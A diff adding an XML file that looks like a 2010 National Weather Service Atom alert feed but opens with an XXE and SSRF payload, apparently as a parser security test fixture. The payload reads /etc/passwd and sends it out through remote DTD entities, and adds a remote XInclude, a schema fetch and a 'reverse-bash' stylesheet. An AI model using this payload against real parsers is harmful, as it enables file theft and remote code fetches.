@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8"?>
+<?xml-stylesheet type="text/xsl" href="http://googleusercontent.com/xalanj-reverse-bash.xsl"?>
+<!DOCTYPE alert PUBLIC "-//A/B/EN" "http://googleusercontent.com/payload1.dtd" [
+  <!ENTITY % remote SYSTEM "http://googleusercontent.com/payload2">
+  <!ENTITY xxe SYSTEM "http://googleusercontent.com/payload3">
+  <!ENTITY % dtd SYSTEM "http://googleusercontent.com/payload4.dtd">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  %remote;
+  %dtd;
+  %send;
+]>
+<feed xmlns = 'http://www.w3.org/2005/Atom'>
+  <x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include
+    href="http://http://googleusercontent.com/1"></xi:include></x>
+  <y xmlns="http://a.b/"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://a.b/
+    http://http://googleusercontent.com/a.xsd">a</y>
+  <!-- http-date = Tue, 31 Aug 2010 02:24:00 GMT -->
+  <id>http://www.weather.gov/alerts-beta/</id>
+  <logo>http://weather.gov/images/xml_logo.gif</logo>
+  <generator>NWS CAP Server</generator>
+  <updated>2010-08-31T14:24:00-00:00</updated>
+  <author>
+    <name>w-nws.webmaster@noaa.gov</name>
+  </author>
+  <title>Current Watches, Warnings and Advisories for the United States Issued by the National Weather Service</title>
+  <link href='http://www.weather.gov/alerts-beta/'/>
+  <entry>
+    <id>http://www.weather.gov/alerts-beta/wwacapget.php?x=CT20100831030400OKXAirQualityAlertOKX20100901031500CT</id>
+    <updated>2010-08-30T23:04:00-04:00</updated>
+    <published>2010-08-30T23:04:00-04:00</published>
+    <author>
+    <name>w-nws.webmaster@noaa.gov</name>
+    </author>
+    <title>Air Quality Alert issued August 30 at 11:04PM EDT expiring August 31 at 11:15PM EDT by NWS NewYorkCity/Upton http://www.nws.noaa.gov/er/okx/</title>
+    <link href='http://www.weather.gov/alerts-beta/wwacapget.php?x=CT20100831030400OKXAirQualityAlertOKX20100901031500CT'/>
+    <summary>...AIR QUALITY ALERT IS IN EFFECT FROM 2 PM TUESDAY UNTIL 10 PM TUESDAY... THE CONNECTICUT DEPARTMENT OF ENVIRONMENTAL PROTECTION HAS ISSUED AN AIR QUALITY ACTION DAY FOR THE FOLLOWING COUNTIES... HOT TEMPERATURES AND ABUNDANT SUNSHINE WILL AID IN THE PRODUCTION OF GROUND-LEVEL OZONE TO THE SOUTH OF CONNECTICUT. WINDS ARE</summary>
+  </entry>
+</feed>
